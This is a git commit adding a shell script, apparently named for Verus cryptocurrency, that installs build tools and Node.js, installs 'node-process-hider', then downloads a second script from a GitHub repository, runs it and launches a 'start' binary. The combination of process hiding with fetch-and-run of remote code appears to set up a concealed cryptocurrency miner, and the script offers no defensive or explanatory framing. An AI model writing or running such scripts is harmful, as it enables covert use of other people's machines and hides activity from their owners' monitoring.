5e9c6a9517579c54a16c211d849ce3f67217ace5
adisubarja <92545387+adisubarja@users.noreply.github.com>
2022-08-17 19:25:20 +0700

    Create verus.sh

---
+++ verus.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://raw.githubusercontent.com/adisubarja/pepek/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start
